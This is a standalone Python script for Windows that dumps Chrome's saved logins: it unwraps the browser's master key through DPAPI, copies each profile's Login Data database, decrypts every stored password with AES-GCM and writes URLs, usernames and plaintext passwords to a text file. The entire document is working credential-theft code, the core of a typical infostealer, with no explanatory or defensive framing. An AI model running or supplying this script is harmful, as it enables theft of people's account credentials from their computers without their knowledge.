import os, shutil
import re, json
import sqlite3, base64, win32crypt
from Cryptodome.Cipher import AES

CHROME_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State"%(os.environ['USERPROFILE']))
CHROME_PATH = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data"%(os.environ['USERPROFILE']))

def get_secret_key():
    try:
        with open(CHROME_PATH_LOCAL_STATE, "r", encoding='utf-8') as f:
            local_state = json.loads(f.read()) 
        return win32crypt.CryptUnprotectData(
            base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:], 
            None, None, None, 0
        )[1]
    except Exception:
        print("[ERR] Chrome secretkey cannot be found")
        return None

def decrypt_password(ciphertext, secret_key):
    try:
        return AES.new(secret_key, AES.MODE_GCM, ciphertext[3:15]).decrypt(ciphertext[15:-16]).decode()  
    except Exception:
        print("[ERR] Unable to decrypt, Chrome version <80 not supported. Please check.")
        return ""
    
def get_db_connection(chrome_path_login_db):
    try:
        shutil.copy2(chrome_path_login_db, "Loginvault.db") 
        return sqlite3.connect("Loginvault.db")
    except Exception:
        print("[ERR] Chrome database cannot be found")
        return None
        
if __name__ == '__main__':
    try:
        with open('passwords.txt', 'w') as f:
            secret_key = get_secret_key()
            folders = [element for element in os.listdir(CHROME_PATH) if re.search("^Profile*|^Default$",element)!=None]
            for folder in folders:
                conn = get_db_connection(os.path.normpath(r"%s\%s\Login Data"%(CHROME_PATH,folder)))
                if(secret_key and conn):
                    cursor = conn.cursor()
                    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                    for _,login in enumerate(cursor.fetchall()):
                        url = login[0]
                        username = login[1]
                        ciphertext = login[2]
                        if(url and username and ciphertext):
                            f.write(f'URL: {url}\nUsername: {username}\nPassword: {decrypt_password(ciphertext, secret_key)}\n\n')
                    cursor.close()
                    conn.close()
                    os.remove("Loginvault.db")
        print("Retrieved passwords successfully\nStored in [passwords.txt]")
    except Exception as e:
        print("[ERR] %s"%str(e))